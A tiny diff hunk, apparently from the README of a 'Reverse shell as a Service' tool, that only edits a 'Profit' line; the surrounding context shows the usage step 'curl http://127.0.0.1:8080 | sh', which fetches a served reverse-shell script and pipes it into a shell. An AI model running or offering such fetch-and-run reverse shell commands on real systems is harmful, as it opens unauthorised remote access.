@@ -12,4 +12,4 @@ Reverse shell as a Service script that executes all the different reverse shells
 
    $ curl http://127.0.0.1:8080 | sh
 
-4. $$$ Profit $$$
+4. Profit $$$
